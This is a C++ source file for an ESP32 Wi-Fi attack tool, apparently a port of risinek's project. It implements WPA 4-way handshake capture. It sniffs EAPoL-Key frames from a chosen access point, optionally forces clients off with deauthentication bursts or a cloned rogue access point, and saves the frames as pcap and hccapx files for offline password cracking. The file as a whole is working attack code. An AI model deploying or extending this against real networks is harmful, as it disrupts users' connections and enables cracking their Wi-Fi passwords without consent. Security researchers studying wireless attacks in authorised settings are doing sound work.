/**
 * @file attack_handshake.cpp
 * @brief WPA 4-way handshake capture attack — converted to C++
 * @author risinek (risinek@gmail.com) | C++ port: Teuku Maulana (TM26)
 */

#include "attack_handshake.h"

#include <cstring>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"

static const char *TAG = "attack_handshake";

static attack_handshake_methods_t s_method     = static_cast<attack_handshake_methods_t>(-1);
static const wifi_ap_record_t    *s_ap_record  = nullptr;

// ── EAPoL-Key frame callback ───────────────────────────────────────────────

static void eapolkey_frame_handler(void * /*args*/,
                                    esp_event_base_t /*event_base*/,
                                    int32_t /*event_id*/,
                                    void *event_data)
{
    ESP_LOGI(TAG, "EAPoL-Key frame captured");
    auto *frame = static_cast<wifi_promiscuous_pkt_t *>(event_data);

    attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len,
                                 frame->rx_ctrl.timestamp);
    hccapx_serializer_add_frame(reinterpret_cast<data_frame_t *>(frame->payload));
}

// ── Public API ─────────────────────────────────────────────────────────────

extern "C" void attack_handshake_start(attack_config_t *cfg) {
    ESP_LOGI(TAG, "Starting Handshake attack...");
    s_method    = static_cast<attack_handshake_methods_t>(cfg->method);
    s_ap_record = cfg->ap_record;

    pcap_serializer_init();
    hccapx_serializer_init(s_ap_record->ssid,
                           strlen(reinterpret_cast<const char *>(s_ap_record->ssid)));

    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(s_ap_record->primary);
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, s_ap_record->bssid);

    ESP_ERROR_CHECK(esp_event_handler_register(
        FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME,
        &eapolkey_frame_handler, nullptr));

    switch (s_method) {
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_LOGD(TAG, "Method: BROADCAST (send 5 deauth bursts)");
            attack_method_broadcast(s_ap_record, 5);
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "Method: ROGUE_AP");
            attack_method_rogueap(s_ap_record);
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            ESP_LOGD(TAG, "Method: PASSIVE (no deauth — listen only)");
            break;
        default:
            ESP_LOGW(TAG, "Unknown method — falling back to PASSIVE");
    }
}

extern "C" void attack_handshake_stop() {
    switch (s_method) {
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            break;
        default:
            ESP_LOGE(TAG, "Unknown method — attack may not be fully stopped");
    }

    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(
        ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &eapolkey_frame_handler));

    s_ap_record = nullptr;
    s_method    = static_cast<attack_handshake_methods_t>(-1);
    ESP_LOGD(TAG, "Handshake attack stopped");
}
